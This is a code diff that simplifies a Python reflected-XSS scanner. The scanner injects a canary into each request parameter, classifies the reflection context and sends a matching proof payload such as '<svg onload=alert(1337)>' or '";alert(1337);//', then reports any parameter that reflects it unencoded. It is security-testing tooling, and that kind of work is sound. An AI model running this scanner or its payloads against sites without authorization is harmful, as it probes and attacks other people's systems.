@@ -2,7 +2,6 @@ import argparse
 import copy
 import html
 import json
-import re
 import uuid
 
 import requests
@@ -19,268 +18,193 @@ class ReflectedXSSScanner:
     def scan(self, target):
         results = []
 
-        for point in target.get("injection_points", []):
-            results.append(self._scan_point(target, point))
+        for parameter in target["parameters"]:
+            results.append(self._scan_parameter(target, parameter))
 
         return {
-            "endpoint_id": target.get("endpoint_id"),
             "url": target["url"],
-            "method": target.get("method", "GET").upper(),
-            "findings": results,
+            "method": target["method"].upper(),
+            "parameters": target["parameters"],
+            "vuln": any(result["vulnerable"] for result in results),
+            "result": results
         }
 
-    def _scan_point(self, target, point):
-        location = point["location"]
-        name = point["name"]
-
-        if location not in ("query", "body"):
-            return {
-                "location": location,
-                "parameter": name,
-                "status": "unsupported",
-                "reason": "현재 MVP는 query/body만 지원합니다.",
-            }
-
+    def _scan_parameter(self, target, parameter):
         canary = f"XSS_CANARY_{uuid.uuid4().hex[:8]}"
 
         try:
-            response = self._send_with_value(
-                target,
-                location,
-                name,
-                canary,
-            )
-        except requests.RequestException as exc:
+            response = self._send(target, parameter, canary)
+        except requests.RequestException as e:
             return {
-                "location": location,
-                "parameter": name,
-                "status": "error",
-                "error": str(exc),
+                "parameter": parameter,
+                "vulnerable": False,
+                "reason": f"request error: {e}"
             }
 
+        # 1. 입력값 반사 여부 확인
         if canary not in response.text:
             return {
-                "location": location,
-                "parameter": name,
-                "status": "not_reflected",
-                "http_status": response.status_code,
+                "parameter": parameter,
+                "vulnerable": False,
+                "reason": "input value was not reflected in response"
             }
 
+        # 2. 반사되는 Context 확인
         context = self._detect_context(response.text, canary)
-        payloads = self._get_payloads(context)
 
-        payload_results = []
+        # 3. Context에 맞는 Payload 선택
+        payload = self._get_payload(context)
 
-        for payload in payloads:
-            try:
-                payload_response = self._send_with_value(
-                    target,
-                    location,
-                    name,
-                    payload,
-                )
-            except requests.RequestException as exc:
-                payload_results.append({
-                    "payload": payload,
-                    "result": "error",
-                    "error": str(exc),
-                })
-                continue
+        try:
+            payload_response = self._send(target, parameter, payload)
+        except requests.RequestException as e:
+            return {
+                "parameter": parameter,
+                "vulnerable": False,
+                "context": context,
+                "reason": f"payload request error: {e}"
+            }
 
-            reflection = self._check_payload_reflection(
-                payload_response.text,
-                payload,
-            )
-
-            payload_results.append({
+        # 4. Payload가 그대로 반사되는지 확인
+        if payload in payload_response.text:
+            return {
+                "parameter": parameter,
+                "vulnerable": True,
+                "context": context,
                 "payload": payload,
-                "result": reflection,
-                "http_status": payload_response.status_code,
                 "evidence": self._get_evidence(
                     payload_response.text,
-                    payload,
-                ),
-            })
+                    payload
+                )
+            }
 
-        raw_reflected = any(
-            item["result"] == "raw_reflected"
-            for item in payload_results
-        )
+        encoded_payload = html.escape(payload, quote=True)
+
+        if encoded_payload in payload_response.text:
+            return {
+                "parameter": parameter,
+                "vulnerable": False,
+                "context": context,
+                "payload": payload,
+                "reason": "payload was HTML-encoded",
+                "evidence": self._get_evidence(
+                    payload_response.text,
+                    encoded_payload
+                )
+            }
 
         return {
-            "location": location,
-            "parameter": name,
-            "status": "likely" if raw_reflected else "reflected",
+            "parameter": parameter,
+            "vulnerable": False,
             "context": context,
-            "http_status": response.status_code,
-            "payload_tests": payload_results,
+            "payload": payload,
+            "reason": "payload was not reflected"
         }
 
-    def _send_with_value(self, target, location, name, value):
-        request_target = copy.deepcopy(target)
+    def _send(self, target, parameter, value):
+        parameters = copy.deepcopy(target["parameters"])
+        parameters[parameter] = value
 
-        query = request_target.get("query", {})
-        body = request_target.get("body", {})
-        headers = request_target.get("headers", {})
-        cookies = request_target.get("cookies", {})
+        headers = {}
 
-        if location == "query":
-            query[name] = value
+        session_cookie = target.get("session_cookie", "")
 
-        elif location == "body":
-            body[name] = value
+        if session_cookie:
+            headers["Cookie"] = session_cookie
 
-        method = request_target.get("method", "GET").upper()
+        method = target["method"].upper()
 
-        request_args = {
-            "method": method,
-            "url": request_target["url"],
-            "params": query,
-            "headers": headers,
-            "cookies": cookies,
-            "timeout": self.timeout,
-            "allow_redirects": True,
-        }
+        if method == "GET":
+            return self.session.get(
+                target["url"],
+                params=parameters,
+                headers=headers,
+                timeout=self.timeout,
+                allow_redirects=True
+            )
 
-        content_type = self._get_content_type(headers)
+        if method == "POST":
+            return self.session.post(
+                target["url"],
+                data=parameters,
+                headers=headers,
+                timeout=self.timeout,
+                allow_redirects=True
+            )
 
-        if method not in ("GET", "HEAD"):
-            if "application/json" in content_type:
-                request_args["json"] = body
-            else:
-                request_args["data"] = body
-
-        return self.session.request(**request_args)
+        raise ValueError(f"Unsupported method: {method}")
 
     @staticmethod
-    def _get_content_type(headers):
-        for key, value in headers.items():
-            if key.lower() == "content-type":
-                return value.lower()
-
-        return ""
-
-    @staticmethod
-    def _detect_context(response_text, marker):
-        index = response_text.find(marker)
+    def _detect_context(response, marker):
+        index = response.find(marker)
 
         if index == -1:
             return "UNKNOWN"
 
-        lower_text = response_text.lower()
+        lower = response.lower()
 
-        # <script> 내부인지 확인
-        script_start = lower_text.rfind("<script", 0, index)
-        script_end = lower_text.rfind("</script", 0, index)
+        # <script>...</script>
+        script_start = lower.rfind("<script", 0, index)
+        script_end = lower.rfind("</script", 0, index)
 
         if script_start > script_end:
             return "JAVASCRIPT"
 
-        # HTML 태그 내부인지 확인
-        tag_start = response_text.rfind("<", 0, index)
-        tag_end = response_text.rfind(">", 0, index)
+        # 현재 Marker가 HTML Tag 내부인지 확인
+        tag_start = response.rfind("<", 0, index)
+        tag_end = response.rfind(">", 0, index)
 
         if tag_start > tag_end:
-            before_marker = response_text[tag_start:index]
-
-            match = re.search(
-                r'([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*["\']?[^"\']*$',
-                before_marker,
-            )
-
-            if match:
-                attribute_name = match.group(1).lower()
-
-                if attribute_name in (
-                    "href",
-                    "src",
-                    "action",
-                    "formaction",
-                ):
-                    return "URL_ATTRIBUTE"
-
-                return "HTML_ATTRIBUTE"
-
-            return "HTML_TAG"
+            return "HTML_ATTRIBUTE"
 
         return "HTML_TEXT"
 
     @staticmethod
-    def _get_payloads(context):
-        payload_map = {
-            "HTML_TEXT": [
+    def _get_payload(context):
+        payloads = {
+            "HTML_TEXT":
                 "<svg onload=alert(1337)>",
-            ],
 
-            "HTML_ATTRIBUTE": [
-                '" autofocus onfocus=alert(1337) x="',
-            ],
+            "HTML_ATTRIBUTE":
+                "\" autofocus onfocus=alert(1337) x=\"",
 
-            "URL_ATTRIBUTE": [
-                "javascript:alert(1337)",
-            ],
+            "JAVASCRIPT":
+                "\";alert(1337);//",
 
-            "JAVASCRIPT": [
-                '";alert(1337);//',
-            ],
-
-            "HTML_TAG": [
-                "<svg onload=alert(1337)>",
-            ],
-
-            "UNKNOWN": [
-                "<svg onload=alert(1337)>",
-            ],
+            "UNKNOWN":
+                "<svg onload=alert(1337)>"
         }
 
-        return payload_map.get(context, payload_map["UNKNOWN"])
+        return payloads.get(context, payloads["UNKNOWN"])
 
     @staticmethod
-    def _check_payload_reflection(response_text, payload):
-        if payload in response_text:
-            return "raw_reflected"
-
-        encoded = html.escape(payload, quote=True)
-
-        if encoded in response_text:
-            return "html_encoded"
-
-        return "not_reflected"
-
-    @staticmethod
-    def _get_evidence(response_text, payload, size=80):
-        index = response_text.find(payload)
+    def _get_evidence(response, value, size=100):
+        index = response.find(value)
 
         if index == -1:
-            encoded = html.escape(payload, quote=True)
-            index = response_text.find(encoded)
-
-            if index == -1:
-                return None
+            return None
 
         start = max(0, index - size)
-        end = min(len(response_text), index + len(payload) + size)
+        end = min(
+            len(response),
+            index + len(value) + size
+        )
 
-        return response_text[start:end]
-
-
-def load_targets(filename):
-    with open(filename, "r", encoding="utf-8") as file:
-        data = json.load(file)
-
-    if "targets" in data:
-        return data["targets"]
-
-    return [data]
+        return response[start:end]
 
 
-def save_results(filename, results):
-    with open(filename, "w", encoding="utf-8") as file:
+def load_input(filename):
+    with open(filename, "r", encoding="utf-8") as f:
+        return json.load(f)
+
+
+def save_result(filename, result):
+    with open(filename, "w", encoding="utf-8") as f:
         json.dump(
-            results,
-            file,
+            result,
+            f,
             indent=2,
-            ensure_ascii=False,
+            ensure_ascii=False
         )
 
 
@@ -291,42 +215,29 @@ def main():
 
     parser.add_argument(
         "input",
-        help="Endpoint JSON 파일",
+        help="Input JSON file"
     )
 
     parser.add_argument(
         "-o",
         "--output",
-        default="xss_results.json",
-        help="결과 JSON 파일",
+        default="xss_result.json",
+        help="Output JSON file"
     )
 
     args = parser.parse_args()
 
-    targets = load_targets(args.input)
+    target = load_input(args.input)
 
     scanner = ReflectedXSSScanner()
+    result = scanner.scan(target)
 
-    results = []
+    save_result(args.output, result)
 
-    for target in targets:
-        print(
-            f"[+] Scanning: "
-            f"{target.get('endpoint_id', target['url'])}"
-        )
-
-        result = scanner.scan(target)
-        results.append(result)
-
-        for finding in result["findings"]:
-            print(
-                f"    {finding.get('parameter')} "
-                f"-> {finding.get('status')}"
-            )
-
-    save_results(args.output, results)
-
-    print(f"\n[+] Result saved: {args.output}")
+    print(f"[+] URL    : {result['url']}")
+    print(f"[+] Method : {result['method']}")
+    print(f"[+] Vuln   : {result['vuln']}")
+    print(f"[+] Output : {args.output}")
 
 
 if __name__ == "__main__":
